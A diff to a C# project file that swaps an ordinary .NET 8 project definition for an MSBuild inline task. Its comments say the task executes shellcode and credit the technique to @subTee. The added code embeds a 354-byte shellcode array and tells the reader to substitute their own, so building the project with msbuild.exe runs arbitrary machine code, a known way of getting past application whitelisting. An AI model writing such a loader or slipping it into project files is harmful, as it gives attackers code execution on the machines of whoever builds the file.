@@ -1,12 +1,16 @@
-﻿<Project Sdk="Microsoft.NET.Sdk">
-
-  <PropertyGroup>
-    <OutputType>Exe</OutputType>
-    <TargetFramework>net8.0</TargetFramework>
-    <ImplicitUsings>enable</ImplicitUsings>
-    <Nullable>enable</Nullable>
-  </PropertyGroup>
-  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+﻿<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+         <!-- This inline task executes shellcode. -->
+         <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
+         <!-- Save This File And Execute The Above Command -->
+         <!-- Author: Casey Smith, Twitter: @subTee -->
+         <!-- License: BSD 3-Clause -->
+    <Target Name="Hello">
+      <ClassExample />
+    </Target>
+    <UsingTask
+      TaskName="ClassExample"
+      TaskFactory="CodeTaskFactory"
+      AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
       <Task>
         <Code Type="Class" Language="cs">
         <![CDATA[
@@ -37,6 +41,7 @@
         );          
       public override bool Execute()
       {
+      //replace with your own shellcode
         byte[] shellcode = new byte[354] {0xfc,0xe8,0x8f,0x00,0x00,0x00,
         0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,
         0x8b,0x52,0x14,0x31,0xff,0x0f,0xb7,0x4a,0x26,0x8b,0x72,0x28,
@@ -84,5 +89,4 @@
         </Code>
       </Task>
     </UsingTask>
-
-</Project>
+  </Project>
